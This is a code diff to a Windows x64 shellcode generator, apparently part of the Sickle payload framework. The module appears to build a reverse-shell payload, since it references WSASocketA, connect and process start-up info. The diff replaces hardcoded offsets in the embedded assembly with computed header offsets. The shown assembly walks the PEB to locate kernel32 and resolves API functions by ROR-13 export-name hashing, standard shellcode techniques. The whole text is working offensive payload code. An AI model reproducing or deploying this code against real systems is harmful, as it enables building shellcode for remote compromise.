@@ -19,6 +19,19 @@ from sickle.common.headers.windows.x64.winsock2 import SOCK_STREAM
 from sickle.common.headers.windows.x64.winsock2 import IPPROTO_TCP
 from sickle.common.headers.windows.x64.winsock2 import sockaddr
 
+from sickle.common.headers.windows.x64.winternl import _PEB
+from sickle.common.headers.windows.x64.winternl import _PEB_LDR_DATA
+from sickle.common.headers.windows.x64.winternl import _LDR_DATA_TABLE_ENTRY
+
+from sickle.common.headers.windows.x64.ntdef import _LIST_ENTRY
+from sickle.common.headers.windows.x64.ntdef import _UNICODE_STRING
+
+from sickle.common.headers.windows.x64.winnt import _IMAGE_DOS_HEADER
+from sickle.common.headers.windows.x64.winnt import _IMAGE_NT_HEADERS64
+from sickle.common.headers.windows.x64.winnt import _IMAGE_OPTIONAL_HEADER64
+
+from sickle.common.headers.windows.x64.winnt import _IMAGE_EXPORT_DIRECTORY
+
 class Shellcode():
 
     arch = "x64"
@@ -86,6 +99,7 @@ class Shellcode():
             "WSASocketA"                    : 0x0a0,
             "connect"                       : 0x0a8,
             # -------------- VARIABLES --------------
+            "tmpFunctionBuffer"             : 0x100,
             "wsaData"                       : 0x200, 
             "name"                          : 0x220,
             "lpStartInfo"                   : 0x300,
@@ -97,24 +111,24 @@ class Shellcode():
         """Generates stub for obtaining the base address of Kernel32.dll
         """
 
-        stub = """
+        stub = f"""
 ; DWORD64 getKernel32()
-; {
+; {{
 ;	 CHAR c = 'K';
 ;	 PPEB pPEB = (PPEB)__readgsqword(0x60);
 ;	 PPEB_LDR_DATA pLdrData = (PLDR_DATA_TABLE_ENTRY)pPEB->Ldr;
 ;	 DWORD64 pHeadEntry = ((DWORD64)((PLDR_DATA_TABLE_ENTRY)pPEB->Ldr->InInitializationOrderModuleList.Flink));
 ;
 ;	 PLIST_ENTRY pEntry = ((PLIST_ENTRY)pHeadEntry)->Flink;
-;	 while (1) {
+;	 while (1) {{
 ;		 PLDR_DATA_TABLE_ENTRY pLdrDataTableEntry = (PLDR_DATA_TABLE_ENTRY)((DWORD64)pEntry - 0x10);
-;		 if (((CHAR*)(pLdrDataTableEntry->FullDllName.Buffer[0]) == c) && ((CHAR*)(pLdrDataTableEntry->FullDllName.Buffer[13]) == '\0')) {
+;		 if (((CHAR*)(pLdrDataTableEntry->FullDllName.Buffer[0]) == c) && ((CHAR*)(pLdrDataTableEntry->FullDllName.Buffer[13]) == '\0')) {{
 ;			 return pLdrDataTableEntry->InInitializationOrderLinks.Flink;
-;		 }
+;		 }}
 ;
 ;		 pEntry = pEntry->Flink;
-;	 }
-; }
+;	 }}
+; }}
 
 getKernel32:
     mov dl, 0x4b
@@ -122,12 +136,12 @@ getPEB:
     mov rcx, 0x60
     mov r8, gs:[rcx]
 getHeadEntry:
-    mov rdi, [r8 + 0x18]
-    mov rdi, [rdi + 0x30]
+    mov rdi, [r8 + {_PEB.Ldr.offset}]
+    mov rdi, [rdi + {_PEB_LDR_DATA.InLoadOrderModuleList.offset}]
 search:
     xor rcx, rcx
-    mov rax, [rdi + 0x10]
-    mov rsi, [rdi + 0x40]
+    mov rax, [rdi + {_LDR_DATA_TABLE_ENTRY.DllBase.offset}]
+    mov rsi, [rdi + {_LDR_DATA_TABLE_ENTRY.BaseDllName.offset + _UNICODE_STRING.Buffer.offset}]
     mov rdi, [rdi]
     cmp [rsi + 0x18], cx
     jne search
@@ -142,22 +156,22 @@ search:
         """Generates the stub responsible for obtaining the base address of a function
         """
 
-        stub = """
+        stub = f"""
 ; UINT hashAlgorithm(char* functionName)
-; {
+; {{
 ;	 DWORD hash = 0x00;
 ;	 DWORD rorByte = 0x0D;
 ;	 for (int i = 0; i < (strlen(functionName)); i++)
-;	 {
+;	 {{
 ;		 hash += (UINT16)functionName[i] & 0xFFFFFFFF;
-;		 if (i < (strlen(functionName) - 1)) {
+;		 if (i < (strlen(functionName) - 1)) {{
 ;			 hash = ((hash >> rorByte) | (hash << (32 - rorByte))) & 0xFFFFFFFF;
-;		 }
-;	 }
+;		 }}
+;	 }}
 ;	 return hash;
-; }
+; }}
 ;
-; void lookupFunction(LPVOID moduleBase, UINT functionHash) {
+; void lookupFunction(LPVOID moduleBase, UINT functionHash) {{
 ;	 PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;
 ;	 PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)moduleBase + dosHeader->e_lfanew);
 ;	 IMAGE_EXPORT_DIRECTORY* exportDirectory = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)moduleBase + ntHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
@@ -165,28 +179,28 @@ search:
 ;	 DWORD numberOfNames = exportDirectory->NumberOfNames;
 ;
 ;	 DWORD i = numberOfNames;
-;	 while (i-- != 0) {
+;	 while (i-- != 0) {{
 ;		 char* functionNameFromModule = (char*)((BYTE*)moduleBase + addressOfNames[i]);
-;		 if (hashAlgorithm(functionNameFromModule) == functionHash) {
+;		 if (hashAlgorithm(functionNameFromModule) == functionHash) {{
 ;			 DWORD* addressOfFunctions = (DWORD*)((BYTE*)moduleBase + exportDirectory->AddressOfFunctions);
 ;			 DWORD* addressOfNameOrdinals = (DWORD*)((BYTE*)moduleBase + exportDirectory->AddressOfNameOrdinals);
 ;			 WORD ordinal = ((WORD*)((BYTE*)moduleBase + exportDirectory->AddressOfNameOrdinals))[i];
 ;			 return (LPVOID)((BYTE*)moduleBase + addressOfFunctions[ordinal]);
-;		 }
-;	 }
-; }
+;		 }}
+;	 }}
+; }}
 
 lookupFunction:
-    mov ebx, [rdi + 0x3c]
-    add rbx, 0x88
+    mov ebx, [rdi + {_IMAGE_DOS_HEADER.e_lfanew.offset}]
+    add rbx, {_IMAGE_NT_HEADERS64.OptionalHeader.offset + _IMAGE_OPTIONAL_HEADER64.DataDirectory.offset}
     add rbx, rdi
     mov eax, [rbx]
     mov rbx, rdi
     add rbx, rax
-    mov eax, [rbx + 0x20]
+    mov eax, [rbx + {_IMAGE_EXPORT_DIRECTORY.AddressOfFunctions.offset}]
     mov r8, rdi
     add r8, rax
-    mov rcx, [rbx + 0x18]
+    mov rcx, [rbx + {_IMAGE_EXPORT_DIRECTORY.NumberOfFunctions.offset}]
 parseNames:
     jecxz error
     dec ecx
@@ -207,11 +221,11 @@ calcDone:
     cmp r9d, edx
     jnz parseNames
 findAddress:
-    mov r8d, [rbx + 0x24]
+    mov r8d, [rbx + {_IMAGE_EXPORT_DIRECTORY.AddressOfNames.offset}]
     add r8, rdi
     xor rax, rax
     mov ax, [r8 + rcx * 2]
-    mov r8d, [rbx + 0x1c]
+    mov r8d, [rbx + {_IMAGE_EXPORT_DIRECTORY.NumberOfNames.offset}]
     add r8, rdi
     mov eax, [r8 + rax * 4]
     add rax, rdi
@@ -228,7 +242,7 @@ error:
         """
 
         lists = from_str_to_xwords(lib)
-        write_index = 0x100
+        write_index = self.storage_offsets['tmpFunctionBuffer']
 
         src = "\nload_library_{}:\n".format(lib.rstrip(".dll"))
         for i in range(len(lists["QWORD_LIST"])):
@@ -251,9 +265,9 @@ error:
             src += "    mov [r15+{}], cl\n".format(hex(write_index))
             write_index += 1
 
-        src += """
-    lea rcx, [r15+0x100]
-    mov rax, [r15+0x80]
+        src += f"""
+    lea rcx, [r15 + {self.storage_offsets['tmpFunctionBuffer']}]
+    mov rax, [r15 + {self.storage_offsets['LoadLibraryA']}]
     call rax
         """
 
